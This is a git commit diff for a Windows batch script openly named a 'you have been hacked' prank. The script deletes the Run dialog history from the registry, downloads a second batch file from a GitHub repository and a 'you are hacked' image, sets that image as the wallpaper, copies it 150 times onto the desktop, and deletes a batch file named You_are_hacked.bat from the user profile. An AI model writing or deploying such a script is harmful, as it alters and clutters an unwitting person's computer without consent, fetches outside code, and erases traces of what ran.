7ab68b82a6925285ecdf6bdd57149e80a2f00fc4
triggerhappy_ <questcraft.online@gmail.com>
2025-04-11 19:08:23 +0200

    Update You_have_been_hacked_prankV2.bat

--- You_have_been_hacked_prankV2.bat
+++ You_have_been_hacked_prankV2.bat
@@ -1,5 +1,5 @@
 @echo off
-cmd /c " reg delete " HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"  /f"
+cmd /c "reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f"
 for /f "tokens=2 delims=:" %%a in ('systeminfo ^| find "System Locale:"') do set locale=%%a
 set locale=%locale: =%
 if /I "%locale:~0,5%"=="nl-NL" (
@@ -8,9 +8,10 @@ if /I "%locale:~0,5%"=="nl-NL" (
     set startscreen=Desktop
 )
 set "dest=%USERPROFILE%\%startscreen%"
-powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Questcraft-Online/OMG_online_storage/refs/heads/main/friendly_reverserV2.bat -OutFile '%dest%\friendly_reverser.bat'"
-powershell -Command "Invoke-WebRequest -Uri https://www.politie-bht.be/assets/images/pictures/article/s_c/300x200/hacking_1493719859.png -OutFile '%dest%\you_are_hacked.png'"
+powershell -C "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Questcraft-Online/OMG_online_storage/refs/heads/main/friendly_reverserV2.bat -OutFile '%dest%\friendly_reverser.bat'"
+powershell -C "Invoke-WebRequest -Uri https://www.politie-bht.be/assets/images/pictures/article/s_c/300x200/hacking_1493719859.png -OutFile '%dest%\you_are_hacked.png'"
 set LOCALE=%locale%
-powershell -Command "$oldWallpaper = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallPaper).WallPaper; if($oldWallpaper -and (Test-Path $oldWallpaper)) { $backupFile = Join-Path $env:USERPROFILE 'info.txt'; \"$env:LOCALE`n$oldWallpaper\" | Out-File -Encoding ASCII $backupFile }"
-powershell -Command "Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\", SetLastError = true)] public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20,0,'%dest%\you_are_hacked.png',3)"
-powershell -Command "for($i=1; $i -le 150; $i++) { Copy-Item -Path '%dest%\you_are_hacked.png' -Destination ('%dest%\You_are_hacked_{0}.png' -f $i) }"
+powershell -C "$oldWallpaper = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallPaper).WallPaper; if($oldWallpaper -and (Test-Path $oldWallpaper)) { $backupFile = Join-Path $env:USERPROFILE 'info.txt'; \"$env:LOCALE`n$oldWallpaper\" | Out-File -Encoding ASCII $backupFile }"
+powershell -C "Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\", SetLastError = true)] public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20,0,'%dest%\you_are_hacked.png',3)"
+powershell -C "for($i=1; $i -le 150; $i++) { Copy-Item -Path '%dest%\you_are_hacked.png' -Destination ('%dest%\You_are_hacked_{0}.png' -f $i) }"
+DEL "%USERPROFILE%\You_are_hacked.bat"
